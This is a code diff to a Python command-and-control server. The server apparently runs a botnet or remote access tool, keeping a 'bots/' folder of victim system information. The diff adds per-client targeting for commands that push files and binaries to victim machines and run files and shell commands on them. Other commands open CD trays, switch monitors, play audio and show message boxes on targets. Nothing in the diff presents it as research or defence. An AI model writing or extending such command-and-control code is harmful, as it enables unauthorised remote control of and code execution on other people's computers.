@@ -37,7 +37,7 @@ def Server():
     def threaded_management(sock):
         
         infofilename = "bots/" + cip + ".txt"
-        print("[↻] Getting system information of " + cip + ".")
+        print("[^] Getting system information of " + cip + ".")
         GetINFO(client, infofilename)
 
         def SendData(data):
@@ -49,19 +49,26 @@ def Server():
             except Exception as serror:
                 print("[ERROR] " + str(serror))
         
-        def private(client, data):
+        def private(cid, data):
             data = data.encode()
-            
             try:
-                client.send(data)
+                csock = clist[cid]
+                csock.send(data)
+            except Exception as serror:
+                print("[ERROR] " + str(serror))
+
+        def private_byte(cid, data): # Send without encoding..
+            try:
+                csock = clist[cid]
+                csock.send(data)
             except Exception as serror:
                 print("[ERROR] " + str(serror))
                 
-        def SendBytes(data): # Send without encoding..
-            try:
-                sock.send(data)
-            except Exception as serror:
-                print("[ERROR] " + str(serror))
+        # def SendBytes(data): # Send without encoding..
+        #     try:
+        #         sock.send(data)
+        #     except Exception as serror:
+        #         print("[ERROR] " + str(serror))
 
         def console():
             try:
@@ -85,49 +92,60 @@ def Server():
                         print("["+str(i)+"]: " + colorama.Style.BRIGHT + colorama.Fore.LIGHTCYAN_EX + iplist[i] + colorama.Style.RESET_ALL)
                 elif(data.startswith("send")):
                     try:
-                        send_socket = int(args[1])
-                        private(clist[send_socket], args[2])
+                        if(len(args[1]) and len(args[2]) > 0):
+                            send_socket = int(args[1])
+                            private(send_socket, args[2])
+                        else:
+                            print(colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX + "USAGE : send <id> <command>" + colorama.Style.RESET_ALL)
                     except IndexError:
-                        print(colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX + "USAGE : send <id> <command>" + colorama.Style.RESET_ALL + str(len(clist)))
+                        print(colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX + "USAGE : send <id> <command>" + colorama.Style.RESET_ALL)
 
 
-                elif(data == "sendfile"):
+                elif(data.startswith("transfer")):
                     try:
-                        filename = input("[?] Filename -> ")
-                        rfilename = input("[?] Filename on Target PC -> ")
+                        filename = args[1]
+                        rfilename = args[2]
+                        client_socket = int(args[3])
                         with open(filename, "r+") as sendfile:
-                            SendData("recvthis="+rfilename)
+                            private(client_socket, "recvthis="+rfilename)
                             data = sendfile.read()
                             bufferst = os.stat(filename)
                             print("[+] File opened " + filename + " ("+str(bufferst.st_size) + " bytes)" )
-                            SendData(data)
+                            private(client_socket, data)
                             print("[+] File Sent.")
                     except FileNotFoundError:
                         print("[x] File not found!?")
+                    except IndexError:
+                        print(colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX + "USAGE : transfer <filename> <remote filename> <client id>" + colorama.Style.RESET_ALL)
                     except Exception as e:
                         print("[x] Error : " + str(e))
                         
-                elif(data == "bsendfile"):
+                elif(data.startswith("bsendfile")):
                     try:
                         #print("(TIP : Use exec-file to Execute an Application)")
-                        filename = input("[?] Binary Filename -> ")
-                        rfilename = input("[?] Binary Filename on Target PC -> ")
+                        filename = args[1]
+                        rfilename = args[2]
+                        client_socket = int(args[3])
                         with open(filename, "rb") as sendfile:
-                            SendData("recvthis="+rfilename)
+                            private(client_socket, "recvthis="+rfilename)
                             data = sendfile.read()
                             bufferst = os.stat(filename)
                             print("[+] File opened " + filename + " ("+str(bufferst.st_size) + " bytes)" )
-                            SendBytes(data)
+                            private_byte(client_socket, data)
                             print("[+] Sending File..")
                     except FileNotFoundError:
                         print("[x] File not found!?")
+                    except IndexError:
+                        print(colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX + "USAGE : bsendfile <filename> <remote filename> <client id>" + colorama.Style.RESET_ALL)
                     except Exception as e:
                         print("[x] Error : " + str(e))
 
                 elif(data == "exec-file"):
-                    appname = input("[>] Enter Filename -> ")
-                    SendData("exec="+appname)
-
+                    try:
+                        appname = args[1]
+                        SendData("exec="+appname)
+                    except IndexError:
+                        print(colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX + "USAGE : exec-file <file on remote pc>" + colorama.Style.RESET_ALL)
                 elif(data == "exec"):
                     command = input("[>] Enter Command -> ")
                     SendData("cmd="+command)
@@ -138,19 +156,29 @@ def Server():
                 elif(data == "username"):
                     SendData("username")
 
-                elif(data == "msgbox"):
-                    msg = input("[>] Enter Message Box Message -> ")
-                    title = input("[>] Enter Message Box Title -> ")
-                    SendData("msgbox="+msg+"="+title)
-                    
+                elif(data.startswith("msgbox")):
+                    try:
+                        client_socket = int(args[1])
+                        msg = input("[>] Enter Message Box Message -> ")
+                        title = input("[>] Enter Message Box Title -> ")
+                        private(client_socket, "msgbox="+msg+"="+title)
+                    except IndexError:
+                        broadcast = input("[x] NO CID (Client ID) specified. Send to all!? (y/n) : ").lower()
+                        if(broadcast == "y"):
+                            msg = input("[>] Enter Message Box Message -> ")
+                            title = input("[>] Enter Message Box Title -> ")
+                            SendData("msgbox="+msg+"="+title)
+                        else:
+                            print("USAGE : msgbox <id>")
 
                 elif(data == "wanip"):
                     SendData("wanip\n")
 
                 elif(data == "help"):
                     print("""
-                    Here are some commands : 
-                    - sendfile - send a normal file (non-binary)
+                    HELP ^_^
+                    - list - List all active clients with their ID's.
+                    - transfer - send a normal file (non-binary)
                     - bsendfile - send a binary file 
                     - kill - kill the connection
                     - info - View remote pc system information
@@ -165,26 +193,68 @@ def Server():
                     - monitoron - Turn monitor ON.
                     - monitoroff - Turn monitor Off.
                     - playaudio - Play Audio.
-                    
-                    Use send <id> <data> to send a command to a single client.
+                    - send - Send to specefic client. (EG: send hostname 0)                    
                     """)
-                elif(data == "cdopen"):
-                    SendData("cdopen")
-                elif(data == "cdclose"):
-                    SendData("cdclose")
-                elif(data == "monitoron"):
-                    SendData("monitoron")
-                elif(data == "monitoroff"):
-                    SendData("monitoroff")
-                elif(data == "playaudio"):
-                    audio = input("[+] Enter Filename (WAV) -> ")
-                    SendData("playaudio="+audio)
-                elif(data == "kill"):
-                    print("[^] Killing Connection...")
-                    SendData("kill")
-                    client.close()
-                    server.close()
-                    exit(True)
+                elif(data.startswith("cdopen")):
+                    try:
+                        client_socket = int(args[1])
+                        private(client_socket, "cdopen")
+                    except IndexError:
+                        broadcast = input("[x] NO CID (Client ID) specified. Send to all!? (y/n) : ").lower()
+                        if(broadcast == "y"):
+                            SendData("cdopen")
+                        else:
+                            print("USAGE : cdopen <id>")
+                elif(data.startswith("cdclose")):
+                    try:
+                        client_socket = int(args[1])
+                        private(client_socket, "cdclose")
+                    except IndexError:
+                        broadcast = input("[x] NO CID (Client ID) specified. Send to all!? (y/n) : ").lower()
+                        if(broadcast == "y"):
+                            SendData("cdclose")
+                        else:
+                            print("USAGE : cdclose <id>")
+                elif(data.startswith("monitoron")):
+                    try:
+                        client_socket = int(args[1])
+                        private(client_socket, "monitoron")
+                    except IndexError:
+                        broadcast = input("[x] NO CID (Client ID) specified. Send to all!? (y/n) : ").lower()
+                        if(broadcast == "y"):
+                            SendData("monitoron")
+                        else:
+                            print("USAGE : monitoron <id>")
+                elif(data.startswith("monitoroff")):
+                    try:
+                        client_socket = int(args[1])
+                        private(client_socket, "monitoroff")
+                    except IndexError:
+                        broadcast = input("[x] NO CID (Client ID) specified. Send to all!? (y/n) : ").lower()
+                        if(broadcast == "y"):
+                            SendData("monitoroff")
+                        else:
+                            print("USAGE : monitoroff <id>")
+                elif(data.startswith("playaudio")):
+                    try:
+                        client_socket = int(args[1])
+                        audio = input("[+] Enter Filename (WAV) -> ")
+                        private(client_socket, "playaudio="+audio)
+                    except IndexError:
+                        broadcast = input("[x] NO CID (Client ID) specified. Send to all!? (y/n) : ").lower()
+                        if(broadcast == "y"):
+                            audio = input("[+] Enter Filename on Remote PC's (WAV) -> ")
+                            SendData("playaudio="+audio)
+                        else:
+                            print("USAGE : playaudio <id>")
+                    
+                elif(data.startswith("kill")):
+                    try:
+                        kill_socket = int(args[1])
+                        clist[kill_socket].close()
+                    except IndexError:
+                        print("USAGE : kill <id> or exit to kill all.")
+        
                 # else:
                 #     print("[~] Unknown command.")
             except KeyboardInterrupt:
@@ -277,7 +347,7 @@ def Server():
 
         cip =  str(addr[0]) 
         cport = str(addr[1])
-        print("[+] Connection from ", cip+":"+cport + " ( " + myip + ":" + str(myport) + " ⇆ " + cip+":"+cport + " )")
+        print("[+] Connection from "+ cip+":"+cport + " ( " + myip + ":" + str(myport) + " --> " + cip+":"+cport + " )")
        
         
         print("[+] HOST " + cip + " has connected.")
